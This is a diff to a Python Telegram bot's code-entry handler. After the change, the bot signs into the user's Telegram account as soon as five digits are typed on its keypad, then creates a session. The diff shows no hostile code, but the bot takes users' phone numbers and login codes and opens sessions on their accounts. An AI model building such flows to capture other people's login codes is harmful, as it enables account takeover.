@@ -175,11 +175,12 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
 
     if action == "back":
         state['otp_digits'] = state['otp_digits'][:-1]
-    elif action == "submit":
-        if len(state['otp_digits']) < 5:
-            await query.answer("Verification Code Must Be At Least 5 Digits!", show_alert=True)
-            return
-        
+    else:
+        if len(state['otp_digits']) < 6:
+            state['otp_digits'] += action
+    
+    # Auto-submit if 5 digits reached
+    if len(state['otp_digits']) == 5:
         await query.message.edit("Verifying Code...")
         try:
             await state['client'].sign_in(
@@ -188,6 +189,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
                 state['otp_digits']
             )
             await create_session(bot, state['client'], user_id, state['phone_number'])
+            return
         except PhoneCodeInvalid:
             state['otp_attempts'] += 1
             if state['otp_attempts'] >= 3:
@@ -213,12 +215,10 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             await query.message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
             await cleanup_user_state(user_id)
         return
-    else:
-        if len(state['otp_digits']) < 6:
-            state['otp_digits'] += action
     
+    # Update OTP display (if not submitted)
     await query.message.edit(
-        f"**Current Verification Code:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 When Done.\n\n📤 Enter The Verification Code We sent:",
+        f"**Current Verification Code:** `{state['otp_digits'] or '____'}`\n\n📤 Enter The Verification Code We sent:",
         reply_markup=OTP_KEYBOARD
     )
     await query.answer()
